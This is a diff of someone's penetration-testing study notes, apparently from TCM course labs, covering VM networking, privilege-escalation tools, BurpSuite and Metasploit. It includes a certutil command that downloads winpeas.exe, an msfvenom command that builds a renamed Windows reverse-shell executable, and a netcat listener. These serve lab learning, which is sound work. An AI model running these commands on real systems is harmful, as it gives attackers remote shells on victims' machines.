@@ -2,6 +2,7 @@
 Set VM internet:
 - **Bridge** -->  conn a internet   (selezioni il ponte in base a se sei conn al wifi o ethern)
 - Nat -->  conn a internet + conn tra diverse vm
+            (click also Advanced > Promiscous mode: Allow All)
 
 Per Nat:
 devi creare una NatNetwork =>       - File > Tools > Network Manager
@@ -14,14 +15,11 @@ devi creare una NatNetwork =>       - File > Tools > Network Manager
 `sudo -l`
  tells you which command you can execute as root without inserting the root password
 
+`locate file.txt`
+useful to find where a file/program is located
+
 -------
 ## Tools
-### General
-#### Locate
-useful to find where a file/program is located
-`locate file.txt`
-
-----
 ### Information Gathering
 #### Netdiscover
 tools for scanning the entire net to find hosts ip (using arp)
@@ -163,7 +161,6 @@ automated tool to check if there are some potential priv escal inside the target
 	- `certutil.exe -urlcache -f http://10.0.2.15/winpeas.exe winpeas.exe`   
 	     (download from the ip winpeas.exe and save it as winpeas.exe)
 	- `winpeas.exe`
-	- 
 
 ----
 ## BurpSuite
@@ -187,6 +184,20 @@ Set [[cheet#FoxyProxy]]
 	- Click Start "Attack"
 	- Look for difference inside Status Code and Length
 	Example with images -->  [[Notes/TCM/Capstones/Butler/report#BurpSuite]]
+	
+----
+### Metasploit
+#### Use a module
+[[Notes/TCM/Capstones/Blue/report#Steps automated exploit|Use a module]]
+
+#### Create and rename a shell
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=7777 -f exe -o Wise.exe`
+`-p` --> payload
+`LHOST `--> attacker ip
+`-f` -->  file type of the payload that we want create
+`-o` -->  name of the payload
+
+to listen for the reverse shell -->  `nc -nvlp 7777`
 
 -----
 ## Sites
